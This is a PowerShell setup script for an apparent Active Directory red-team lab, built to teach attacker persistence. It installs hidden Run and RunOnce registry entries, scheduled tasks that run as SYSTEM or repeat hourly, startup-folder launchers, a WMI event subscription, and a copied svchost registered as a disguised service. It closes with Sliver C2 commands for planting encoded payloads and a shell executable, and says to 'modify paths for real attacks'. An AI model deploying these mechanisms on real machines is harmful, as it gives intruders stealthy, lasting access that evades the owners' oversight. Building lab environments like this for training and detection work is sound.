# ============================================================
# ORSUBANK AD RED TEAM LAB - PERSISTENCE MECHANISMS
# ============================================================
# Script Name: Enable-PersistenceMechanisms.ps1
# Purpose: Creates persistence mechanisms for attackers to maintain access
# Location: Run on WS01 and WS02
# 
# WHAT THIS SCRIPT DOES:
# Creates VULNERABLE persistence mechanisms that attackers can abuse:
# 1. Registry Run Keys - Auto-execute on login
# 2. Scheduled Tasks - Time-based execution
# 3. Startup Folder - Scripts run at login
# 4. WMI Subscriptions - Event-based persistence
# 5. Service Persistence - Hidden services
# ============================================================

# Verify running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] ERROR: Run this script as Administrator!" -ForegroundColor Red
    exit 1
}

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║              ORSUBANK - PERSISTENCE MECHANISMS CONFIGURATION                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Creating persistence mechanisms for red team exercises                       ║
║  Machine: $($env:COMPUTERNAME)                                                           ║
║  NOTE: These create EXAMPLES of persistence, not actual backdoors             ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# PERSISTENCE 1: REGISTRY RUN KEYS
# ============================================================

Write-Host "[*] Creating PERSISTENCE 1: Registry Run Keys" -ForegroundColor Yellow
Write-Host "    Adding entries to common Run key locations" -ForegroundColor Gray

# Create a benign persistence script path
$PersistenceScript = "C:\Windows\Temp\persistence_demo.ps1"
@"
# Demo persistence script
# In real attack, this would be a reverse shell
Write-Host "Persistence demo running at $(Get-Date)"
"@ | Out-File $PersistenceScript

# HKCU Run (per-user, no admin needed to SET but we're demoing)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "ORSUBankUpdater" `
    -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $PersistenceScript"

# HKLM Run (all users, needs admin)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "ORSUBankSync" `
    -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $PersistenceScript"

# RunOnce (runs once then deletes itself)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" `
    -Name "ORSUBankSetup" `
    -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $PersistenceScript"

Write-Host "    [+] Created HKCU\Run: ORSUBankUpdater" -ForegroundColor Green
Write-Host "    [+] Created HKLM\Run: ORSUBankSync" -ForegroundColor Green
Write-Host "    [+] Created HKCU\RunOnce: ORSUBankSetup" -ForegroundColor Green
Write-Host "    [!] These run PowerShell at every login!" -ForegroundColor Magenta

# ============================================================
# PERSISTENCE 2: SCHEDULED TASKS
# ============================================================

Write-Host "`n[*] Creating PERSISTENCE 2: Scheduled Tasks" -ForegroundColor Yellow

# Create multiple scheduled tasks with different triggers
$TaskScript = "C:\Windows\Temp\scheduled_demo.ps1"
"Write-Host 'Scheduled task persistence demo'" | Out-File $TaskScript

# Task 1: Runs at system startup
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $TaskScript"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "ORSUStartupSync" -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
Write-Host "    [+] Created 'ORSUStartupSync' - runs at startup as SYSTEM" -ForegroundColor Green

# Task 2: Runs at user logon
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Limited
Register-ScheduledTask -TaskName "ORSULogonTask" -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
Write-Host "    [+] Created 'ORSULogonTask' - runs at user login" -ForegroundColor Green

# Task 3: Runs every hour (beaconing)
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 365)
Register-ScheduledTask -TaskName "ORSUHourlySync" -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
Write-Host "    [+] Created 'ORSUHourlySync' - runs every hour (beaconing)" -ForegroundColor Green

# ============================================================
# PERSISTENCE 3: STARTUP FOLDER
# ============================================================

Write-Host "`n[*] Creating PERSISTENCE 3: Startup Folder Scripts" -ForegroundColor Yellow

# All Users Startup
$AllUsersStartup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$StartupScript = Join-Path $AllUsersStartup "ORSUStartup.bat"
@"
@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Write-Host 'Startup persistence demo'"
"@ | Out-File $StartupScript -Encoding ASCII

Write-Host "    [+] Created startup script: $StartupScript" -ForegroundColor Green
Write-Host "    [!] Runs for ALL users at login!" -ForegroundColor Magenta

# Current User Startup (show how attacker would do it)
$UserStartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$UserStartupScript = Join-Path $UserStartup "ORSUUserSync.vbs"
@"
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Write-Host 'User startup demo'""", 0, False
"@ | Out-File $UserStartupScript -Encoding ASCII

Write-Host "    [+] Created user startup script: $UserStartupScript" -ForegroundColor Green

# ============================================================
# PERSISTENCE 4: WMI EVENT SUBSCRIPTION
# ============================================================

Write-Host "`n[*] Creating PERSISTENCE 4: WMI Event Subscription" -ForegroundColor Yellow
Write-Host "    This is a fileless persistence technique!" -ForegroundColor Gray

try {
    # Create WMI subscription that fires when notepad is opened
    $FilterName = "ORSUFilter"
    $ConsumerName = "ORSUConsumer"
    
    # Query: trigger when any new process is created
    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
    
    # Create the filter
    $Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
        Name = $FilterName
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = $Query
    }
    
    # Create the consumer (what runs when triggered)
    $Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
        Name = $ConsumerName
        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command ""Write-Host 'WMI persistence triggered!'"""
    }
    
    # Bind them together
    $Binding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }
    
    Write-Host "    [+] Created WMI subscription: triggers when notepad.exe starts" -ForegroundColor Green
    Write-Host "    [!] This is FILELESS - no scripts on disk!" -ForegroundColor Magenta
} catch {
    Write-Host "    [!] WMI subscription failed: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# PERSISTENCE 5: HIDDEN SERVICE
# ============================================================

Write-Host "`n[*] Creating PERSISTENCE 5: Hidden Service" -ForegroundColor Yellow

# Create a service that looks legitimate
Copy-Item "C:\Windows\System32\svchost.exe" "C:\Windows\Temp\ORSUHost.exe" -Force

sc.exe create "ORSUHostService" binPath= "C:\Windows\Temp\ORSUHost.exe -k netsvcs" start= auto type= share | Out-Null
sc.exe description "ORSUHostService" "ORSU Bank Network Services Host Process" | Out-Null

Write-Host "    [+] Created 'ORSUHostService' (looks like svchost)" -ForegroundColor Green
Write-Host "    [!] Service named to blend in with legitimate services!" -ForegroundColor Magenta

# ============================================================
# VERIFICATION
# ============================================================

Write-Host "`n" + "=" * 70 -ForegroundColor DarkGray
Write-Host "VERIFICATION" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor DarkGray

Write-Host "`n[*] Registry Run Keys:" -ForegroundColor Yellow
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object -Property ORSU* | Format-List
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object -Property ORSU* | Format-List

Write-Host "[*] Scheduled Tasks:" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.TaskName -like "ORSU*"} | ForEach-Object {
    Write-Host "    [+] $($_.TaskName): $($_.State)" -ForegroundColor Green
}

Write-Host "`n[*] Startup Folder Items:" -ForegroundColor Yellow
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Where-Object {$_.Name -like "ORSU*"} | ForEach-Object {
    Write-Host "    [+] $($_.Name)" -ForegroundColor Green
}

Write-Host "`n[*] WMI Subscriptions:" -ForegroundColor Yellow
Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Where-Object {$_.Filter -like "*ORSU*"} | ForEach-Object {
    Write-Host "    [+] WMI Binding found" -ForegroundColor Green
}

# ============================================================
# ATTACK INSTRUCTIONS
# ============================================================

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║                         PERSISTENCE TECHNIQUES                               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  TECHNIQUE 1: REGISTRY RUN KEYS (Most Common)                               ║
║  ─────────────────────────────────────────────                               ║
║  [Sliver] > reg write "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"║
║             -name "Updater" -value "powershell.exe -enc <PAYLOAD>"           ║
║                                                                              ║
║  TECHNIQUE 2: SCHEDULED TASKS                                                ║
║  ─────────────────────────────────────────────                               ║
║  [Sliver] > shell                                                            ║
║  PS> Register-ScheduledTask -TaskName "Update" -Trigger (New-ScheduledTask   ║
║      Trigger -AtLogOn) -Action (New-ScheduledTaskAction -Execute "cmd"       ║
║      -Argument "/c powershell -enc <PAYLOAD>")                               ║
║                                                                              ║
║  TECHNIQUE 3: STARTUP FOLDER                                                 ║
║  ─────────────────────────────────────────────                               ║
║  [Sliver] > upload shell.exe "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\║
║             Windows\\Start Menu\\Programs\\Startup\\updater.exe"             ║
║                                                                              ║
║  TECHNIQUE 4: WMI EVENT SUBSCRIPTION (Fileless!)                             ║
║  ─────────────────────────────────────────────                               ║
║  [Sliver] > execute-assembly /opt/tools/SharpStay.exe wmi process notepad    ║
║             powershell.exe -enc <PAYLOAD>                                    ║
║                                                                              ║
║  DETECTION: Use Autoruns (SysInternals) to view ALL persistence              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor White

Write-Host "[+] Persistence mechanisms configured!" -ForegroundColor Green
Write-Host "[!] NOTE: These are DEMO persistence - modify paths for real attacks" -ForegroundColor Yellow
